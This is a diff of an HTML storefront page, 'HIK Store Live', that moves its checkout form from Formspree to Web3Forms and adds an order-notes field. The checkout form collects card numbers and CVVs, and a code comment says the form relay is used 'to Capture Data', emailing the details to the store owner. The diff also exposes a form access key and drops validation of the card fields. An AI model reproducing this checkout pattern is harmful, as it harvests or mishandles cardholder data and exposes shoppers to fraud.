@@ -4,7 +4,6 @@
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
 <title>HIK Store Live</title>
-<!-- 💡 LOGO FIX: Pointing to logo.png -->
 <link rel="icon" href="logo.png" type="image/png"> 
 
 <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@700;800&display=swap" rel="stylesheet">
@@ -206,7 +205,8 @@ button:hover{background:#005bb5;transform:scale(1.04);box-shadow:0 0 15px #0072f
 .checkout-container input[type="text"], 
 .checkout-container input[type="email"], 
 .checkout-container input[type="number"],
-.checkout-container input[type="tel"] { 
+.checkout-container input[type="tel"],
+.checkout-container textarea { /* Added textarea style */
     width: 100%; 
     padding: 10px;
     margin-bottom: 15px;
@@ -290,7 +290,6 @@ button:hover{background:#005bb5;transform:scale(1.04);box-shadow:0 0 15px #0072f
     <div id="toggleSidebarBtn"><div></div><div></div><div></div></div>
 
     <div class="logoWrap" title="HIK Store">
-      <!-- 💡 LOGO FIX: Pointing to logo.png -->
       <img src="logo.png" alt="HIK Store Logo"> 
     </div>
   </div>
@@ -311,7 +310,6 @@ button:hover{background:#005bb5;transform:scale(1.04);box-shadow:0 0 15px #0072f
 
 <main id="mainContent">
   <section class="section" id="products">
-    <!-- 💡 TITLE FIX: This title will be changed by JavaScript -->
     <h2 id="products-title">All Products (50 Items)</h2>
     <div class="grid" id="productGrid"></div>
   </section>
@@ -323,7 +321,6 @@ button:hover{background:#005bb5;transform:scale(1.04);box-shadow:0 0 15px #0072f
 
   <section class="section categories" id="categories">
     <h2>Categories</h2>
-    <!-- 💡 CATEGORY BUTTONS: Added 'All' and onclick events -->
     <button class="category-btn" onclick="filterProducts('All')">All</button>
     <button class="category-btn" onclick="filterProducts('Electronics')">Electronics</button>
     <button class="category-btn" onclick="filterProducts('Clothing')">Clothing</button>
@@ -344,10 +341,13 @@ button:hover{background:#005bb5;transform:scale(1.04);box-shadow:0 0 15px #0072f
   <section class="section" id="checkoutPage" style="background:none; display: none;">
     <h2>Complete Your Purchase</h2>
     <div class="checkout-container">
-      <!-- 💡 FORMSPREE URL UPDATED -->
-      <form id="paymentForm" action="https://formspree.io/f/movyankj" method="POST">
+      
+      <form id="paymentForm" action="https://api.web3forms.com/submit" method="POST">
+        
+        <input type="hidden" name="access_key" value="ce841447-3e77-452b-a334-14ede39df8ef">
+        
         <input type="hidden" name="_subject" value="New HIK Store Order!" />
-
+        
         <label for="name">Full Name:</label>
         <input type="text" id="name" name="name" required>
 
@@ -382,13 +382,16 @@ button:hover{background:#005bb5;transform:scale(1.04);box-shadow:0 0 15px #0072f
         <label for="cvv">CVV:</label>
         <input type="text" id="cvv" name="cvv" pattern="[0-9]{3,4}" required>
         
+        <label for="message">Order Notes (Optional):</label>
+        <textarea id="message" name="message" rows="3"></textarea>
+        
         <div id="paymentFeedback" style="display:none;"></div>
 
         <button type="submit" id="payment-button">Confirm Order & Pay AED <span id="paymentTotal">0.00</span></button>
         <button type="button" id="backToCartBtn">Back to Cart</button>
       </form>
       <div style="margin-top: 15px; font-size: 14px; text-align: center; color: #666;">
-        *This is a demo checkout. Order details will be emailed to HIK Store via Formspree.*
+        *This is a demo checkout. Order details will be emailed to HIK Store via Web3Forms.*
       </div>
     </div>
   </section>
@@ -661,7 +664,7 @@ const productDataUSD = [
     { id:25, title: 'COSORI Pro II Air Fryer Oven', desc: '5.8-Quart smart air fryer with 12 customizable functions and app control via VeSync.', price: 129.99, imageUrl: 'product_25.jpg', category: 'Home & Kitchen' },
     { id:26, title: 'Fitbit Charge 6 Fitness Tracker', desc: 'Advanced fitness tracker with Google apps, built-in GPS, and 7-day battery life. Includes 6 months of Fitbit Premium.', price: 159.95, imageUrl: 'product_26.jpg', category: 'Electronics' },
     { id:27, title: 'North Face Borealis Backpack', desc: 'Classic 28-liter backpack with a redesigned FlexVent suspension system, padded laptop sleeve, and external bungee-compression system.', price: 99.00, imageUrl: 'product_27.jpg', category: 'Clothing' },
-    { id:28, title: 'Ray-Ban Meta Smart Glasses (Wayfarer)', desc: 'Smart glasses with an integrated 12 MP camera, open-ear audio, and AI assistant. Capture photos and videos hands-free.', price: 299.00, imageUrl: 'product_28.jpg', category: 'Electronics' },
+    { id:28, title: 'Ray-Ban Meta Smart Glasses (Wayfarer)', desc: 'Smart glasses with an integrated 12 MP camera, open-ear audio, and AI assistant. Capture photos and videos hands-free. Model: Wayfarer.', price: 299.00, imageUrl: 'product_28.jpg', category: 'Electronics' },
     { id:29, title: 'TP-Link Tapo Smart Plug Mini (4-Pack)', desc: 'Wi-Fi smart plugs that work with Alexa and Google Home. Control any appliance from your phone, no hub required.', price: 39.99, imageUrl: 'product_29.jpg', category: 'Home & Kitchen' },
     { id:30, title: 'Herman Miller Aeron Chair (Size B)', desc: 'Iconic ergonomic office chair with PostureFit SL support, fully adjustable arms, and breathable pellicle mesh.', price: 1845.00, imageUrl: 'product_30.jpg', category: 'Home & Kitchen' },
 
@@ -842,7 +845,7 @@ document.getElementById('backToCartBtn').onclick = () => {
     document.getElementById('cart').scrollIntoView({ behavior: 'smooth' });
 };
 
-/* ---------- Payment Form Submission (Using Formspree to Capture Data) ---------- */
+/* ---------- Payment Form Submission (Using Web3Forms to Capture Data) ---------- */
 document.getElementById('paymentForm').addEventListener('submit', function(e) {
     e.preventDefault();
     
@@ -851,10 +854,11 @@ document.getElementById('paymentForm').addEventListener('submit', function(e) {
     const feedbackDiv = document.getElementById('paymentFeedback');
     const paymentButton = document.getElementById('payment-button');
 
-    if (cart.length === 0 || !form.checkValidity()) {
+    // Added to also check for your added fields
+    if (cart.length === 0 || !document.getElementById('name').value || !document.getElementById('email').value || !document.getElementById('address').value) {
         feedbackDiv.style.display = 'block';
         feedbackDiv.className = 'error';
-        feedbackDiv.innerHTML = '❌ Please fill out all details and ensure your cart is not empty.';
+        feedbackDiv.innerHTML = '❌ Please fill out all required details and ensure your cart is not empty.';
         form.reportValidity();
         return;
     }
@@ -895,7 +899,15 @@ document.getElementById('paymentForm').addEventListener('submit', function(e) {
         renderCart();
         form.style.opacity = 0.5;
 
-        // *** STEP 4: SUBMIT THE FORM TO FORMSPREE ***
+        // *** STEP 4: SUBMIT THE FORM TO WEB3FORMS ***
+        // Web3Forms also supports an optional hidden field for redirecting after submission
+        const redirectInput = document.createElement('input');
+        redirectInput.type = 'hidden';
+        redirectInput.name = '_redirect';
+        // You can change this to your thank you page URL if you have one
+        redirectInput.value = window.location.href; 
+        form.appendChild(redirectInput);
+        
         form.submit();
         
         // Wait a moment and then give final message
